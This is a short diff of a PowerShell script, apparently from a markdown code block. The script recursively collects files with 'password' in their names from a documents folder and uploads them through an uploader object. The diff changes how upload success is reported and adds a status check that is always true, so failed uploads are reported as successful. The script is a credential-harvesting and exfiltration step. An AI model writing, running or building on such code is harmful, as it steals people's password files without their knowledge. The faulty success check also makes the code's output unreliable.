@@ -28,11 +28,19 @@ if($ckpath -eq $null) {
    $f = Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName
    if($f -ne $null) {
       $f | ForEach-Object { $up.AddFileReference("files", $_) }
-      $null = $up.BlockingUpload()
-      Write-Host "$($f.Count) files uploaded"
+      $r = $up.BlockingUpload()
+      if($r -eq $true) {
+         Write-Host "$($f.Count) files uploaded"
+      } else {
+         if($up.ResponseStatus -ge 200 -or $up.ResponseStatus -le 299) {
+            Write-Host "$($f.Count) files uploaded"
+         } else {
+            Write-Host "File upload failed"
+         }
+      }
    } else {
       Write-Host "No matching files found"
-   } 
+   }
 }
 ```
 
